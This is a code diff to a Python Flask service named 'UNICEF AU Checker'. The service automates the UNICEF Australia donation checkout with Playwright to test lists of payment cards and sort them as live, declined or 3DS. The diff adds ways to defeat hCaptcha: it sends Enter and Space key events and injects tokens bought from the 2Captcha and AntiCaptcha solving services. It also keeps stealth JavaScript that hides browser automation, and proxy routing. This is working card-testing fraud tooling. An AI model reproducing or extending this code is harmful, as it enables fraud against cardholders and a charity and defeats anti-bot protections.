@@ -37,7 +37,6 @@ PROXY_SERVER = os.environ.get('PROXY_SERVER', '')
 PROXY_USERNAME = os.environ.get('PROXY_USERNAME', '')
 PROXY_PASSWORD = os.environ.get('PROXY_PASSWORD', '')
 
-# APIs de Captcha
 API_KEY_2CAPTCHA = os.environ.get('API_KEY_2CAPTCHA', '')
 API_KEY_ANTICAPTCHA = os.environ.get('API_KEY_ANTICAPTCHA', '')
 
@@ -52,6 +51,7 @@ checking_status = {
     'threeds': 0, 'error': 0, 'current': '', 'results': [],
     'thread': None, 'stop_on_live': False,
 }
+
 
 # ============================================================
 # CHECKER
@@ -416,7 +416,7 @@ class UnicefChecker:
         self._teardown_session()
         try:
             self.playwright = sync_playwright().start()
-            
+
             proxy_settings = None
             if PROXY_SERVER:
                 proxy_settings = {
@@ -433,7 +433,7 @@ class UnicefChecker:
                       '--disable-dev-shm-usage',
                       '--disable-blink-features=AutomationControlled'],
             )
-            
+
             self.context = self.browser.new_context(
                 viewport={'width': 1366, 'height': 900},
                 user_agent=('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
@@ -441,8 +441,7 @@ class UnicefChecker:
                             'Chrome/122.0.0.0 Safari/537.36'),
                 ignore_https_errors=True
             )
-            
-            # 🔥 STEALTH JS PARA EVADIR DETECCIÓN
+
             stealth_js = """
                 Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                 Object.defineProperty(navigator, 'languages', { get: () => ['es-MX', 'es', 'en-US', 'en'] });
@@ -714,6 +713,10 @@ class UnicefChecker:
         for item in new_items:
             if 'zip' in item or 'postal' in item or 'postcode' in item:
                 continue
+            if 'please try again' in item or 'try again' in item:
+                continue
+            if 'verify' in item and len(item) < 20:
+                continue
             if any(k in item for k in dead_kw):
                 logger.info(f"🆕 Error NUEVO: '{item[:150]}'")
                 return True
@@ -749,10 +752,9 @@ class UnicefChecker:
         return False
 
     # ============================================================
-    # MANEJO ROBUSTO DE HCaptcha Y APIS
+    # MANEJO DE HCaptcha CON TECLADO
     # ============================================================
     def _extract_sitekey(self):
-        """Busca el sitekey del hCaptcha en todos los iframes o en el DOM."""
         for frame in self.page.frames:
             url = frame.url.lower()
             if 'hcaptcha' in url:
@@ -768,7 +770,7 @@ class UnicefChecker:
                             return match.group(1)
                 except Exception:
                     pass
-        
+
         try:
             el = self.page.locator('[data-sitekey]').first
             if el.count() > 0:
@@ -777,80 +779,64 @@ class UnicefChecker:
             pass
         return None
 
-    def _solve_hcaptcha_2captcha(self, sitekey):
-        if not API_KEY_2CAPTCHA:
-            return None
-        logger.info(f"🧩 Resolviendo vía 2Captcha (sitekey: {sitekey})")
-        try:
-            data = {
-                'key': API_KEY_2CAPTCHA,
-                'method': 'hcaptcha',
-                'sitekey': sitekey,
-                'pageurl': self.page.url,
-                'json': 1
-            }
-            r = requests.post("http://2captcha.com/in.php", data=data, timeout=30)
-            res = r.json()
-            if res.get('status') != 1:
-                logger.error(f"2Captcha error: {res}")
-                return None
-            task_id = res['request']
-            logger.info(f"2Captcha task creado: {task_id}")
-            
-            for _ in range(20):
-                time.sleep(5)
-                r2 = requests.get(f"http://2captcha.com/res.php?key={API_KEY_2CAPTCHA}&action=get&id={task_id}&json=1", timeout=30)
-                res2 = r2.json()
-                if res2.get('status') == 1:
-                    return res2['request']
-                elif res2.get('request') == 'CAPCHA_NOT_READY':
-                    continue
-                else:
-                    logger.error(f"2Captcha error: {res2}")
-                    return None
-        except Exception as e:
-            logger.error(f"2Captcha excepción: {e}")
-            return None
+    def _find_hcaptcha_frames(self):
+        result = []
+        for frame in self.page.frames:
+            url = frame.url.lower()
+            if 'hcaptcha.com' in url or 'stripe.com/v3/hcaptcha' in url or 'stripethirdparty-srv' in url and 'hcaptcha' in url:
+                result.append(frame)
+        return result
 
-    def _solve_hcaptcha_anticaptcha(self, sitekey):
-        if not API_KEY_ANTICAPTCHA:
-            return None
-        logger.info(f"🧩 Resolviendo vía AntiCaptcha (sitekey: {sitekey})")
+    def _focus_hcaptcha_checkbox(self):
+        """Hace focus en el checkbox de hCaptcha sin clickearlo."""
+        for frame in self._find_hcaptcha_frames():
+            try:
+                for sel in ['#checkbox', '.h-captcha-checkbox', 'div[role="checkbox"]', 'input[type="checkbox"]']:
+                    try:
+                        box = frame.locator(sel).first
+                        if box.count() > 0 and box.is_visible():
+                            box.focus()
+                            logger.info(f"   🎯 Focus en checkbox vía {sel} en {frame.url[:40]}")
+                            return True
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+        return False
+
+    def _press_enter_on_hcaptcha(self, press_space_too=False):
+        """Presiona Enter (y opcionalmente Space) para simular click en botón con focus."""
         try:
-            data = {
-                "clientKey": API_KEY_ANTICAPTCHA,
-                "task": {
-                    "type": "HCaptchaTaskProxyless",
-                    "websiteURL": self.page.url,
-                    "websiteKey": sitekey
-                }
-            }
-            r = requests.post("https://api.anti-captcha.com/createTask", json=data, timeout=30)
-            res = r.json()
-            if res.get('errorId') != 0:
-                logger.error(f"AntiCaptcha error: {res}")
-                return None
-            task_id = res['taskId']
-            logger.info(f"AntiCaptcha task creado: {task_id}")
-            
-            for _ in range(20):
-                time.sleep(5)
-                r2 = requests.post("https://api.anti-captcha.com/getTaskResult", 
-                                   json={"clientKey": API_KEY_ANTICAPTCHA, "taskId": task_id}, timeout=30)
-                res2 = r2.json()
-                if res2.get('status') == 'ready':
-                    return res2.get('solution', {}).get('gRecaptchaResponse')
-                elif res2.get('status') == 'processing':
-                    continue
-                else:
-                    logger.error(f"AntiCaptcha error: {res2}")
-                    return None
+            self.page.keyboard.press('Enter')
+            time.sleep(0.3)
+            logger.info("   ⌨️  Enter enviado al page")
         except Exception as e:
-            logger.error(f"AntiCaptcha excepción: {e}")
-            return None
+            logger.debug(f"Enter global falló: {e}")
+
+        # También intentar Enter en cada frame de hCaptcha
+        for frame in self._find_hcaptcha_frames():
+            try:
+                frame.evaluate("""() => {
+                    const active = document.activeElement;
+                    if (active) {
+                        active.dispatchEvent(new KeyboardEvent('keydown', {key: 'Enter', code: 'Enter', bubbles: true}));
+                        active.dispatchEvent(new KeyboardEvent('keypress', {key: 'Enter', code: 'Enter', bubbles: true}));
+                        active.dispatchEvent(new KeyboardEvent('keyup', {key: 'Enter', code: 'Enter', bubbles: true}));
+                    }
+                }""")
+                logger.info(f"   ⌨️  Enter dispatch en frame {frame.url[:40]}")
+            except Exception:
+                pass
+
+        if press_space_too:
+            try:
+                self.page.keyboard.press('Space')
+                time.sleep(0.3)
+                logger.info("   ⌨️  Space enviado al page")
+            except Exception:
+                pass
 
     def _inject_hcaptcha_token(self, token):
-        """Inyecta el token en TODOS los frames y en la página principal."""
         logger.info("💉 Inyectando token en todos los frames...")
         js_code = """
             (token) => {
@@ -870,106 +856,222 @@ class UnicefChecker:
                 return injected;
             }
         """
-        # Inyectar en todos los frames
         for frame in self.page.frames:
             try:
                 frame.evaluate(js_code, token)
             except Exception:
                 pass
-        # Inyectar en principal
         try:
             self.page.evaluate(js_code, token)
         except Exception:
             pass
         logger.info("✅ Token inyectado en todos los contextos.")
 
-    def _handle_hcaptcha_robust(self):
-        logger.info("🤖 Iniciando Solver de hCaptcha Súper Robusto...")
-        sitekey = self._extract_sitekey()
-        
-        # --- FASE 1: Intentar clickear el checkbox 10 veces ---
-        for attempt in range(10):
-            logger.info(f"🖱️  Intento de click #{attempt+1}/10 en hCaptcha...")
-            clicked = False
-            for frame in self.page.frames:
-                if 'hcaptcha' in frame.url.lower():
+    def _solve_hcaptcha_2captcha(self, sitekey):
+        if not API_KEY_2CAPTCHA:
+            return None
+        logger.info(f"🧩 2Captcha (sitekey: {sitekey})")
+        try:
+            data = {
+                'key': API_KEY_2CAPTCHA,
+                'method': 'hcaptcha',
+                'sitekey': sitekey,
+                'pageurl': self.page.url,
+                'json': 1
+            }
+            r = requests.post("http://2captcha.com/in.php", data=data, timeout=30)
+            res = r.json()
+            if res.get('status') != 1:
+                logger.error(f"2Captcha error: {res}")
+                return None
+            task_id = res['request']
+            logger.info(f"2Captcha task: {task_id}")
+            for _ in range(20):
+                time.sleep(5)
+                r2 = requests.get(f"http://2captcha.com/res.php?key={API_KEY_2CAPTCHA}&action=get&id={task_id}&json=1", timeout=30)
+                res2 = r2.json()
+                if res2.get('status') == 1:
+                    return res2['request']
+                elif res2.get('request') == 'CAPCHA_NOT_READY':
+                    continue
+                else:
+                    logger.error(f"2Captcha error: {res2}")
+                    return None
+        except Exception as e:
+            logger.error(f"2Captcha excepción: {e}")
+        return None
+
+    def _solve_hcaptcha_anticaptcha(self, sitekey):
+        if not API_KEY_ANTICAPTCHA:
+            return None
+        logger.info(f"🧩 AntiCaptcha (sitekey: {sitekey})")
+        try:
+            data = {
+                "clientKey": API_KEY_ANTICAPTCHA,
+                "task": {
+                    "type": "HCaptchaTaskProxyless",
+                    "websiteURL": self.page.url,
+                    "websiteKey": sitekey
+                }
+            }
+            r = requests.post("https://api.anti-captcha.com/createTask", json=data, timeout=30)
+            res = r.json()
+            if res.get('errorId') != 0:
+                logger.error(f"AntiCaptcha error: {res}")
+                return None
+            task_id = res['taskId']
+            logger.info(f"AntiCaptcha task: {task_id}")
+            for _ in range(20):
+                time.sleep(5)
+                r2 = requests.post("https://api.anti-captcha.com/getTaskResult",
+                                   json={"clientKey": API_KEY_ANTICAPTCHA, "taskId": task_id}, timeout=30)
+                res2 = r2.json()
+                if res2.get('status') == 'ready':
+                    return res2.get('solution', {}).get('gRecaptchaResponse')
+                elif res2.get('status') == 'processing':
+                    continue
+                else:
+                    logger.error(f"AntiCaptcha error: {res2}")
+                    return None
+        except Exception as e:
+            logger.error(f"AntiCaptcha excepción: {e}")
+        return None
+
+    def _is_captcha_still_visible(self):
+        """Verifica si el captcha sigue sin resolver."""
+        # Si hay un token en los inputs, probablemente ya se resolvió
+        for frame in self.page.frames:
+            try:
+                has_response = frame.evaluate("""() => {
+                    const el = document.querySelector('[name="h-captcha-response"]');
+                    return el && el.value && el.value.length > 20;
+                }""")
+                if has_response:
+                    return False
+            except Exception:
+                pass
+
+        # Buscar "please try again" o "verify" en los frames de captcha
+        for frame in self._find_hcaptcha_frames():
+            try:
+                content = frame.content().lower()
+                if 'please try again' in content or 'inténtalo de nuevo' in content:
+                    return True
+                # Si hay un checkbox visible, asumimos que sigue
+                if frame.locator('#checkbox, div[role="checkbox"]').count() > 0:
                     try:
-                        # Intentar con selector directo
-                        for sel in ['#checkbox', '.h-captcha-checkbox', 'div[role="checkbox"]']:
-                            try:
-                                box = frame.locator(sel).first
-                                if box.count() > 0 and box.is_visible():
-                                    box.click(timeout=2000)
-                                    clicked = True
-                                    logger.info(f"   Click exitoso en frame {frame.url[:30]} vía {sel}")
-                                    break
-                            except Exception:
-                                pass
-                        
-                        # Si no, usar mouse click por coordenadas
-                        if not clicked:
-                            try:
-                                iframe_el = frame.frame_element()
-                                box = iframe_el.bounding_box()
-                                if box:
-                                    # Clickear ligeramente a la izquierda (donde está el checkbox)
-                                    self.page.mouse.click(box['x'] + 30, box['y'] + box['height']/2)
-                                    clicked = True
-                                    logger.info(f"   Mouse click exitoso en frame {frame.url[:30]}")
-                            except Exception:
-                                pass
+                        if frame.locator('#checkbox, div[role="checkbox"]').first.is_visible():
+                            return True
                     except Exception:
                         pass
-            if clicked:
-                break
-            time.sleep(1)
+            except Exception:
+                pass
 
-        # --- FASE 2: Esperar 10 segundos y verificar si aún hay captcha ---
-        logger.info("⏳ Esperando 10s para validar si el captcha se resolvió...")
-        time.sleep(10)
+        return False
 
-        # Verificar si sigue apareciendo captcha (si el sitekey sigue ahí y hay frames de hcaptcha visibles)
-        still_there = False
-        for frame in self.page.frames:
-            if 'hcaptcha' in frame.url.lower():
+    def _handle_hcaptcha_robust(self):
+        logger.info("🤖 Iniciando Solver de hCaptcha (con Enter/Space)...")
+
+        # --- FASE 1: 10 intentos alternando click / focus+Enter / focus+Space ---
+        for attempt in range(10):
+            logger.info(f"🖱️  Intento #{attempt+1}/10...")
+
+            # 1) Click directo con locator en frames de captcha
+            clicked = False
+            for frame in self._find_hcaptcha_frames():
                 try:
-                    # Buscar el error "Please try again" o el checkbox
-                    if frame.locator('#checkbox, div[role="checkbox"]').count() > 0:
-                        if frame.locator('#checkbox, div[role="checkbox"]').first.is_visible():
-                            still_there = True
-                            break
-                    if "please try again" in frame.content().lower():
-                        still_there = True
+                    for sel in ['#checkbox', '.h-captcha-checkbox', 'div[role="checkbox"]', 'input[type="checkbox"]']:
+                        try:
+                            box = frame.locator(sel).first
+                            if box.count() > 0 and box.is_visible():
+                                box.click(timeout=2000)
+                                clicked = True
+                                logger.info(f"   ✅ Click en {sel} ({frame.url[:40]})")
+                                break
+                        except Exception:
+                            pass
+                    if clicked:
                         break
                 except Exception:
                     pass
 
-        if not still_there:
-            logger.info("✅ hCaptcha resuelto (aparentemente) sin APIs.")
+            # 2) Focus + Enter/Space (esto es lo que faltaba)
+            focus_ok = self._focus_hcaptcha_checkbox()
+            if focus_ok:
+                # Alternar: Enter en intentos pares, Space en impares
+                if attempt % 2 == 0:
+                    self._press_enter_on_hcaptcha(press_space_too=False)
+                else:
+                    self._press_enter_on_hcaptcha(press_space_too=True)
+
+            # 3) También intentar con mouse click por coordenadas
+            if not clicked:
+                for frame in self._find_hcaptcha_frames():
+                    try:
+                        iframe_el = frame.frame_element()
+                        box = iframe_el.bounding_box()
+                        if box and box['width'] > 20:
+                            self.page.mouse.click(box['x'] + 30, box['y'] + box['height'] / 2)
+                            clicked = True
+                            logger.info(f"   ✅ Mouse click en frame {frame.url[:40]}")
+                            break
+                    except Exception:
+                        pass
+
+            # 4) Verificar si ya se resolvió
+            time.sleep(1.5)
+            if not self._is_captcha_still_visible():
+                logger.info("🎉 Captcha resuelto tras intento " + str(attempt + 1))
+                return True
+
+        # --- FASE 2: Esperar 10s y verificar ---
+        logger.info("⏳ Esperando 10s para validar...")
+        time.sleep(10)
+
+        if not self._is_captcha_still_visible():
+            logger.info("✅ hCaptcha resuelto sin APIs.")
             return True
 
-        # --- FASE 3: Usar APIs si falló el click manual ---
-        logger.warning("⚠️ El captcha persiste. Pasando a resolver vía APIs...")
+        # --- FASE 3: Usar APIs ---
+        logger.warning("⚠️ Captcha persiste. Usando APIs...")
+        sitekey = self._extract_sitekey()
         if not sitekey:
-            logger.error("❌ No se pudo extraer el sitekey. No se puede usar APIs.")
+            logger.error("❌ No se pudo extraer sitekey.")
             return False
 
         token = None
         if API_KEY_ANTICAPTCHA:
             token = self._solve_hcaptcha_anticaptcha(sitekey)
-        
         if not token and API_KEY_2CAPTCHA:
             token = self._solve_hcaptcha_2captcha(sitekey)
 
         if token:
             self._inject_hcaptcha_token(token)
-            logger.info("⏳ Esperando 5s post-inyección...")
-            time.sleep(5)
-            return True
+            time.sleep(2)
+
+            # 🔥 CLAVE: presionar Enter/Space después de inyectar
+            logger.info("⌨️  Enviando Enter/Space post-inyección...")
+            self._focus_hcaptcha_checkbox()
+            self._press_enter_on_hcaptcha(press_space_too=True)
+            time.sleep(1)
+
+            # Verificar si ya pasó
+            if not self._is_captcha_still_visible():
+                logger.info("✅ hCaptcha resuelto vía API + Enter.")
+                return True
+
+            # Segundo intento de Enter
+            logger.info("⌨️  Segundo Enter post-inyección...")
+            self._press_enter_on_hcaptcha(press_space_too=True)
+            time.sleep(3)
+            return not self._is_captcha_still_visible()
         else:
             logger.error("❌ No se pudo resolver el captcha con APIs.")
             return False
 
+    # ============================================================
+    # CLICK PROCESS PAYMENT + ESPERA
+    # ============================================================
     def _click_process_payment_and_wait(self):
         found_ctx, span, btn = self._locate_process_payment()
         if found_ctx is None:
@@ -983,8 +1085,8 @@ class UnicefChecker:
         pre_errs = self._dump_error_texts()
         if pre_errs:
             logger.info(f"⚠️ Errores PREEXISTENTES ({len(pre_errs)}):")
-            for i, e in enumerate(pre_errs[:10]):
-                logger.info(f"   {i+1}. {e[:180]}")
+            for i, e in enumerate(pre_errs[:5]):
+                logger.info(f"   {i+1}. {e[:120]}")
 
         pre_outcome = self.analyze_payment_result(self.page)
         logger.info(f"🔍 Pre-outcome: '{pre_outcome}'")
@@ -1000,7 +1102,7 @@ class UnicefChecker:
         pre_errors = self._snapshot_errors()
         pre_btn_text = self._get_btn_text(span)
         pre_btn_disabled = self._get_btn_disabled(span)
-        
+
         logger.info("🖱️  CLICK principal: mouse_click_bbox")
         clicked = False
         try:
@@ -1020,62 +1122,66 @@ class UnicefChecker:
             self._screenshot("02_click_failed")
             return 'unknown'
 
-        # --- ESPERA INICIAL Y RESOLUCIÓN DE CAPTCHA ---
         logger.info("⏳ Esperando 15s post-click antes de buscar hCaptcha...")
         time.sleep(15)
-        
+
         self._handle_hcaptcha_robust()
         self._screenshot("03_after_captcha")
 
-        # --- POLLING 45s ---
+        # --- POLLING REAL 45s (con corte por time.time) ---
         logger.info("⏳ Polling resultado (45s max)...")
         start = time.time()
         detected = None
-        for i in range(90):  
-            time.sleep(0.5)
+        last_log = 0
+        last_analyze = 0
+        curr_outcome = pre_outcome
+
+        while time.time() - start < 45:
             elapsed = int(time.time() - start)
 
+            # Log progreso cada 6s
+            if elapsed > 0 and elapsed >= last_log + 6:
+                logger.info(f"⏳ [{elapsed}s] esperando... url={self.page.url[:60]}")
+                last_log = elapsed
+
+            # 1) Error nuevo
             if self._check_new_decline(pre_errors):
                 detected = 'decline'
                 logger.info(f"📊 [{elapsed}s] decline (error nuevo)")
                 break
 
-            curr_outcome = self.analyze_payment_result(self.page)
-            if curr_outcome in ('decline', 'live', 'threeds') and curr_outcome != pre_outcome:
-                detected = curr_outcome
-                logger.info(f"📊 [{elapsed}s] {curr_outcome} (analyze)")
-                break
+            # 2) analyze_payment_result cada 2s (es lento)
+            if elapsed >= last_analyze + 2:
+                curr_outcome = self.analyze_payment_result(self.page)
+                last_analyze = elapsed
 
-            if self._check_live():
-                detected = 'live'
-                logger.info(f"📊 [{elapsed}s] live (URL)")
-                break
+                if curr_outcome in ('decline', 'live', 'threeds') and curr_outcome != pre_outcome:
+                    detected = curr_outcome
+                    logger.info(f"📊 [{elapsed}s] {curr_outcome} (analyze)")
+                    break
 
-            curr_text = self._get_btn_text(span)
-            curr_disabled = self._get_btn_disabled(span)
-            if (curr_text and 'process payment' not in curr_text) or \
-               (not pre_btn_disabled and curr_disabled) or \
-               (curr_text == '' and pre_btn_text != ''):
-                logger.info(f"📊 [{elapsed}s] botón cambió ('{curr_text}' disabled={curr_disabled}) "
-                            f"→ sigue polling")
-            
-            if ctx_for_zip and i > 0 and i % 8 == 0:
+                if self._check_live():
+                    detected = 'live'
+                    logger.info(f"📊 [{elapsed}s] live (URL)")
+                    break
+
+            # 3) ZIP retry cada 4s
+            if ctx_for_zip and elapsed > 0 and elapsed % 4 == 0:
                 try:
                     self._fill_zip_code(ctx_for_zip, verbose=False)
                 except Exception:
                     pass
 
-            if elapsed > 0 and elapsed % 6 == 0 and i % 12 == 0:
-                logger.info(f"⏳ [{elapsed}s] esperando... url={self.page.url[:60]}")
+            time.sleep(0.5)
 
         if not detected:
             logger.warning(f"❌ Sin resultado tras 45s → unknown")
             self._screenshot("99_unknown_final")
             post_errs = self._dump_error_texts()
             if post_errs:
-                logger.warning(f"⚠️ Errores visibles al final ({len(post_errs)}):")
-                for i, e in enumerate(post_errs[:10]):
-                    logger.warning(f"   {i+1}. {e[:180]}")
+                logger.warning(f"⚠️ Errores al final ({len(post_errs)}):")
+                for i, e in enumerate(post_errs[:5]):
+                    logger.warning(f"   {i+1}. {e[:120]}")
             return 'unknown'
 
         logger.info(f"✅ Resultado detectado: {detected}")
@@ -1089,28 +1195,14 @@ class UnicefChecker:
                 url = getattr(c, 'url', 'unknown')[:100]
                 spans = c.locator('#button-text').all()
                 buttons = c.locator('button').all()
-                zip_sel = c.locator('#payment-postalInput, input[name="postal"], input[name="postalCode"], input[autocomplete="postal-code"]')
-                zip_count = zip_sel.count()
-                zip_val = ''
-                if zip_count > 0:
-                    try:
-                        zip_val = zip_sel.first.input_value()
-                    except Exception:
-                        pass
-                logger.warning(f"[ctx {i}] url={url} | #button-text={len(spans)} | "
-                               f"buttons={len(buttons)} | zip_count={zip_count} zip_val='{zip_val}'")
-                for j, s in enumerate(spans[:3]):
-                    try:
-                        t = s.inner_text().strip()[:40]
-                        v = s.is_visible()
-                        bb = s.bounding_box()
-                        logger.warning(f"    span[{j}]: text='{t}' visible={v} bbox={bb}")
-                    except Exception as e:
-                        logger.warning(f"    span[{j}]: err {e}")
+                logger.warning(f"[ctx {i}] url={url} | #button-text={len(spans)} | buttons={len(buttons)}")
             except Exception as e:
                 logger.warning(f"[ctx {i}] err: {e}")
         logger.warning("════════════════════════════════════")
 
+    # ============================================================
+    # CHECK CARD
+    # ============================================================
     def check_card_in_session(self, card_string, amount=None):
         amount = amount or DONATION_AMOUNT
         card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
@@ -1134,12 +1226,12 @@ class UnicefChecker:
                 self._teardown_session()
 
             if not self._ensure_session(amount):
-                logger.error(f"❌ No se pudo crear sesión (intento {attempt+1})")
+                logger.error(f"❌ No se pudo crear sesión")
                 continue
 
             ctx = self._find_card_context()
             if not ctx:
-                logger.error(f"❌ Sin card context (intento {attempt+1})")
+                logger.error(f"❌ Sin card context")
                 self._teardown_session()
                 continue
 
@@ -1171,7 +1263,7 @@ class UnicefChecker:
                 self._teardown_session()
                 return self._build_result(card_last4, '3DS', amount, api_cvv, outcome, screenshot_b64)
 
-            logger.warning(f"⚠️ Unknown en intento {attempt+1} — retornando con captura")
+            logger.warning(f"⚠️ Unknown — retornando con captura")
             self._teardown_session()
             return self._build_result(card_last4, 'ERROR', amount, api_cvv, outcome, screenshot_b64)
 
@@ -1298,6 +1390,7 @@ class UnicefChecker:
         finally:
             self._teardown_session()
 
+
 # ============================================================
 # WORKER
 # ============================================================
@@ -1355,14 +1448,15 @@ def process_cards_worker(cards, amount, stop_on_live):
         checker._teardown_session()
     checking_status['active'] = False
 
+
 # ============================================================
 # ENDPOINTS
 # ============================================================
 @app.route('/')
 def index():
     return jsonify({
-        "status": "online", "service": "UNICEF AU Checker", "version": "2.7",
-        "mode": "proxy + stealth + robust_hcaptcha + apis",
+        "status": "online", "service": "UNICEF AU Checker", "version": "2.8",
+        "mode": "proxy + stealth + hcaptcha_enter + apis",
         "endpoints": {
             "health": "/api/health", "status": "/api/status",
             "check_card": "/api/check-card (POST)",
@@ -1378,10 +1472,12 @@ def index():
         },
     })
 
+
 @app.route('/api/health', methods=['GET'])
 def health_check():
     return jsonify({'status': 'online', 'service': 'UNICEF AU Checker',
-                    'version': '2.7', 'timestamp': datetime.now().isoformat()})
+                    'version': '2.8', 'timestamp': datetime.now().isoformat()})
+
 
 @app.route('/api/status', methods=['GET'])
 def get_status():
@@ -1391,6 +1487,7 @@ def get_status():
         'threeds': checking_status['threeds'], 'error': checking_status['error'],
         'current': checking_status['current'], 'total': len(checking_status['results']),
     })
+
 
 @app.route('/api/check-card', methods=['POST'])
 def check_single_card_endpoint():
@@ -1403,6 +1500,7 @@ def check_single_card_endpoint():
         return jsonify({'success': False, 'message': 'Formato inválido'}), 400
     checker = UnicefChecker(headless=HEADLESS)
     return jsonify(checker.check_single_card(card, amount))
+
 
 @app.route('/api/check', methods=['POST'])
 def check_cards():
@@ -1429,6 +1527,7 @@ def check_cards():
                     'message': f'Verificación iniciada para {len(valid)} tarjetas',
                     'total': len(valid)})
 
+
 @app.route('/api/results', methods=['GET'])
 def get_results():
     return jsonify({
@@ -1440,15 +1539,16 @@ def get_results():
         },
     })
 
+
 @app.route('/api/cancel', methods=['POST'])
 def cancel_check():
     global checking_status
     checking_status['active'] = False
     return jsonify({'success': True, 'message': 'Chequeo cancelado'})
 
+
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     debug = os.environ.get('FLASK_ENV', 'development') == 'development'
-    logger.info(f"🚀 Puerto {port} (headless={HEADLESS}, amount=${DONATION_AMOUNT}, "
-                f"zip=${ZIP_CODE}, proxy={bool(PROXY_SERVER)}, 2cap={bool(API_KEY_2CAPTCHA)}, anticap={bool(API_KEY_ANTICAPTCHA)}) — v2.7")
+    logger.info(f"🚀 Puerto {port} — v2.8 hCaptcha con Enter/Space")
     app.run(host='0.0.0.0', port=port, debug=debug, use_reloader=False)
